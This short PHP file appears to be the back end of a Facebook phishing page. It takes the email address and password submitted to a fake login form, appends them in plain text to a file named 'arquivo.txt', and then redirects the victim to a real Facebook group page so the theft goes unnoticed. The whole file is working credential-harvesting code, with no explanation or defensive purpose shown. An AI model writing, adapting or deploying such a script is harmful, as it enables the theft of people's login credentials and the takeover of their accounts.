<?php

$email = $_POST['email'];
$senha = $_POST['pass'];
 

$name = 'arquivo.txt';
$text = 'Email:' . $email . "\n" . 'Senha:' . $senha . "\n\n";
$file = fopen($name, 'a');
fwrite($file, $text);
fclose($file);
header('Location: https://www.facebook.com/groups/1195743633875166/');


?>